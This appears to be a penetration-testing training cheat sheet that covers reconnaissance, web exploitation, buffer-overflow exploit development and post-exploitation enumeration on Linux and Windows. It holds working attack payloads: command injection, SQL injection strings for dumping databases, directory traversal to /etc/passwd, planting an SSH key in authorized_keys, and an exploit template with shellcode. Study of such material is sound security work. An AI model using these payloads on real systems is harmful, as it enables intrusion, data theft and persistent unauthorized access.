# Recon Syntax

## Reconnaissance Workflow

### 1. Received an IP or Network

- If it is `10.50...`, skip to the next step
- Otherwise, ping sweep **from target space** (the box where you found the IP) against the `/24`

### 2. Found Live IPs

- Scan for open ports (through dynamic tunnel from your ops box)

### 3. Found Open Ports

- Banner grab / `nmap -sV` version scan to identify specific software/services

### 4. Run Additional Enumeration Scripts

- SMB OS discovery
- HTTP enum
- etc.

---

## Dealing with Services

### SMB

- Run `smb-os-enum`

### FTP

- `wget -r` (you can provide creds if you have them to get more info)
- Actually look at what you download

### HTTP

- `wget -r` (be aware, not an active website -- no interaction means no web exploitation)
- Check for `robots.txt` and open everything in it, even if (especially if) it says denied
- Click things, open all links in new tabs so you don't forget to check them (`Ctrl+F` for `href` in source)
- Run HTTP-enum scan script and open all pages and directories found
- View page source and developer tools (`F12`) to check for scripts, GET or POST methods, etc.

### SSH or RDP

- If you have creds or keys, log in
- If you don't, make note -- you may find them later

---

## Web Exploitation

### Look for Interactive Elements

Look for input boxes, dropdowns, interactive elements, JavaScript, and PHP files.

### Input Box Testing

If you find a box you can type in:

- **Command injection:** `; whoami`
- **SQL injection:** `tom' or 1='1`
- **Directory traversal:** `../../../../../../../../etc/passwd` OR `/etc/hosts`
- **XSS:** Use/modify cookie stealer (usually on trouble tickets, message boards, chat logs, etc.)

### URL Parameter Testing

If you interact with a box/button/dropdown and the URL contains `...php?variable=XXX`:

- Same techniques as above but in the URL bar
- SQL is less concerned with the `'` if the variable value is a number rather than a text string
  - Example: `option=1 OR 1=1` or `option=cars' OR 1='1`
  - Numbers don't usually require quotation marks

### File Upload Testing

If you find a place you can upload:

- Can you access the directory it uploads to? If not, uploading does no good
- Will it let you upload a malicious file? Like a script or command injection payload

### SQL Injection -- Database Dumping

If SQL injection works and you get different results:

1. **Basic test:** `tom' OR 1='1` -- tries to display everything in that table
2. **For login pages:** `tom' OR 1='1` for username and password
   - **POST (box) method:** tends to log you in as the first entry it finds
   - **GET (url) method:** dumps the login table (except first entry)

**Steps to dump the whole database:**

1. Identify vulnerable field using `OR 1=1`
2. Identify number of columns: `option=1 UNION SELECT 1,2,3...` until you get results
   - You need to know how many columns it needs and where the data will appear
3. **Golden statement:**
   ```sql
   option' UNION SELECT table_schema,table_name,column_name[,extra columns] FROM information_schema.columns; #
   ```
4. Duplicate tab so you don't have to repeat this -- keep it open as reference
5. Look for user-generated tables
6. Extract data:
   ```sql
   UNION SELECT [column1],[column2],[column3]... FROM [database].[table]
   ```

### Command Injection to SSH Access

If you have command injection:

1. `whoami` to know which account is running the website
2. Check `/etc/passwd` to see if the website user has a login shell and what their home directory is (it may not be in `/home`)
3. Ensure they have a `.ssh` directory in their home directory (if not, make it)
4. `echo [id_rsa.pub] >> [home]/.ssh/authorized_keys`
5. SSH in with that user account

---

## Binary Analysis and Exploitation Development

### Static Analysis

- **cffexplorer:** file type, hashes, strings, headers, DLLs imported, is it packed?

### Behavioral Analysis

- Set up sandbox, run procmon/fakenet if available, take snapshots
- Run it, play around with it, take notes on what happens
- Stop it, check sandbox and snapshots to see what changed

### Dynamic Analysis

- Behavioral analysis using debuggers

### Disassembly

- Open in Ghidra and accept all defaults when importing the file
- Search for strings found during static and behavioral analysis to find the main function
- **Option A:** Start at the beginning with the first strings found when running it, and work forward
- **Option B:** Start at the END from the result you wish to get and work backward
- Rename functions and variables to make it easier to track what is happening

### Patching

- Right click on the assembly code you wish to change and modify it
- Export program as PE or ELF depending on the original format

---

## Exploit Development

### Local Buffer Overflow

1. Load the binary in `gdb` and run it
2. Crash it with a segmentation fault by generating a long string from the [Wiremask pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
3. Copy the value from the EIP field into Wiremask to determine the **OFFSET**
4. **Verify** by running binary with the script:
   ```python
   offset = "A" * [offset value]
   eip = "BBBB"
   send(offset + eip)
   ```
   - EIP should be four B's -- if not, offset is wrong
5. Open binary in `gdb` without peda (`env gdb binary`) and `unset COLUMNS` and `LINES`
6. Repeat step 4, then run `info proc map` after crashing
7. Find `jmp esp` values:
   ```
   find /b [first address after HEAP], [last address before STACK], 0xff, 0xe4
   ```
   - Copy down 3-5 resulting memory addresses in case one doesn't work
8. Generate shellcode in msfconsole/msfvenom (payload = `linux/x86/execute` or similar)
9. **Send it:**
   - As command line argument: `binary $(python script.py)`
   - As binary prompt for input: `binary <<< $(python script.py)`

### Exploit Script Template

```python
#!/usr/bin/python
offset = 'A' * [offset value]
eip = 0x78563412  # Reverse byte order: 12 34 56 78 becomes 78 56 34 12
nop = 0x90 * 10   # NOP sled for safety
# [paste shellcode here]
# Send: offset + eip + nop + buf
```

### Remote Buffer Overflow

1. Identify that port 9999 (or whatever) is actually vulnserver/secureserver
2. Steps 2-7: use the existing methodology from local overflow
3. Open a listener on your linops
4. Change the IP/port in the existing script
5. Execute

---

## Post Exploitation: Linux

### Users and Groups

```bash
cat /etc/passwd          # and shadow if you have privs
cat /etc/group
ls -la /home
ls -la ~
whoami
hostname
```

### Network Information

```bash
cat /etc/hosts
ss -nltp                 # Show listeners
ss -auntp                # Show all connections including established
ip a                     # Network interfaces and addresses
ip n                     # ARP table (new version of arp -a)
ip r                     # Routing table
```

### Running Processes and Services

```bash
ps -elfH                 # Show processes
systemctl list-units --type service
# OR
service --status-all
ls -la /etc              # Check configs as needed
```

### Check Logging

- Check for syslog/rsyslog and read the config file if running
- `ls -latr /var/log` to see what logs updated since arrival
- If strange logs appear, check `/etc/` for related configs
- Timestamps help identify all logs associated with an event

### Scheduled Tasks

```bash
cat /etc/crontab
# Check /etc/cron* (cron.d, cron.daily, cron.monthly, etc.)
# Check /var/spool/cron
```

**Key questions:**

- Can I write to any of the above files or directories?
- Are there any jobs I can take advantage of?
- Are there any jobs I need to be concerned about?

### Files of Interest

```bash
find / -type f -iname "what you're looking for"
find / -type d -iname "directory name"
```

**Directories to check:**

- `/tmp` and `/var/tmp`
- `/usr/share`
- `/root` (if you have privs)

**Look for:** SSH keys, network maps, password files, temp files (`.swp`, etc.)

```bash
# Find writable files and directories (bonus if in cron)
find / -type f -writable -o -type d -writable 2>/dev/null
```

### Privilege Escalation

```bash
sudo -l
# SUID and SGID
find / -type f -perm /6000 -ls 2>/dev/null
```

**Techniques:**

- Check [GTFOBins](https://gtfobins.github.io/) for anything found that isn't on linops
- SSH key masquerading (steal existing keys or upload your public key)
- Cronjobs executing as root that you can write to
- Users with `.` in their PATH (place a script with the same name in a directory where they will run it)

---

## Post Exploitation: Windows

### Users and Groups

```cmd
net user                     :: See all users
net user [username]          :: Learn about specific users
net localgroup
net localgroup [name]        :: Learn about a specific group
query user                   :: See who is logged in
whoami
```

### Network Information

```cmd
netstat /ano                 :: Add /b if you have privs
ipconfig /all
arp -a
route print
net view
```

### Running Processes and Services

```cmd
tasklist /v                  :: Or Task Manager (GUI)
net start                    :: Or tasklist /svc, or Services Manager (GUI)
```

### Check Logging

```cmd
wevtutil el                  :: Shows all logs
wevtutil qe [logname] /c:[entries] /rd:true /f:text
wevtutil qe [logname] /c:[entries] /rd:false /f:text /q:"*[System[(EventID=### or EventID=###)]]"
```

- Also use Event Viewer (GUI)

### Scheduled Tasks

```cmd
schtasks /v                  :: User-created stuff is usually at the top
```

- Also use Task Scheduler (GUI)

### Files of Interest

**Directories to check:**

- User's documents, public documents, admin's documents
- `C:\Users`
- `C:\Windows\Temp`
- Registry keys: `[HKLM|HKCU]\Software\Microsoft\Windows\CurrentVersion\[Run|RunOnce]`

### Privilege Escalation

**Techniques:**

- **DLL hijacking:** Understand DLL search order; use procmon to identify missing DLLs, msfvenom to generate malicious DLLs
- Check if netstat shows vulnserver or another exploitable service
- Find user-created services (no description = probably user-created) with writable paths
- Check schtasks/task scheduler for jobs running from writable files/directories
- **Unquoted paths:** `C:\Program Files\A Directory\file` will first try to execute `C:\Program Files\A.exe`

**Note:** Scheduled tasks execute when told to, but services typically require a restart.
